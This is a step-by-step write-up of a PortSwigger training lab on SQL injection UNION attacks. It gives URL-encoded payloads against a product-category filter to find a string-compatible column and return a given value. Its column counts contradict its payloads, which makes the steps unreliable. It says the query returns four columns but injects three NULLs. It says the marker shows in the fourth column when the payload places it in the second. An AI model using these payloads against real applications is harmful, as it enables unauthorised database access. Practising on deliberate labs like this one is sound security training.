
# SQL injection UNION attack, finding a column containing text

## This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

## The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data

#sql_injection_union
___

step 1

click on any category to filter the result and send to repeater

![screnshot](lab4_lifestyle_category.jpg)

step 2

here query returns four columns so you have to use `' UNION SELECT NULL,NULL,NULL--` 
`' UNION SELECT NULL,NULL,NULL--` => (URL Encoded) `'+UNION+SELECT+NULL,NULL,NULL--`
add  `'+UNION+SELECT+NULL,NULL,NULL--` at the end 
`/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--`

![screnshot](lab4_lifestyle_null_null_null.jpg)

step 3

since query returns four columns so you have to use
>' UNION SELECT 'a',NULL,NULL,NULL-- 
>' UNION SELECT NULL,'a',NULL,NULL-- 
>' UNION SELECT NULL,NULL,'a',NULL-- 
>' UNION SELECT NULL,NULL,NULL,'a'--

If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
`Conversion failed when converting the varchar value 'a' to data type int.`

first payload
add `'+UNION+SELECT+'a',NULL,NULL--` at the end
`/filter?category=Lifestyle'+UNION+SELECT+'a',NULL,NULL--`

![screnshot](lab4_lifestyle_a_null_null.jpg)

step 4

`/filter?category=Lifestyle'+UNION+SELECT+NULL,'a',NULL--`
you will notice `a` added in the fourth column

![screnshot](lab4_lifestyle_null_a_null.jpg)

step 5

since database retrieve string is `'RknAON'` it might be different in your case
replace a with `'RknAON'`
final payload will be `'+UNION+SELECT+NULL,'RknAON',NULL--` 
`/filter?category=Lifestyle'+UNION+SELECT+NULL,'RknAON',NULL--`

![screnshot](lab4_lifetyle_a_rknaon_null.jpg)

step 6

to solve the lab copy  `'+UNION+SELECT+NULL,'RknAON',NULL--` 
add at the end of URL press enter your lab will solved

![screnshot](portswigger_wsa/P01_server_side_topic/P01_sql_injection/images/lab4_solved_lab.jpg)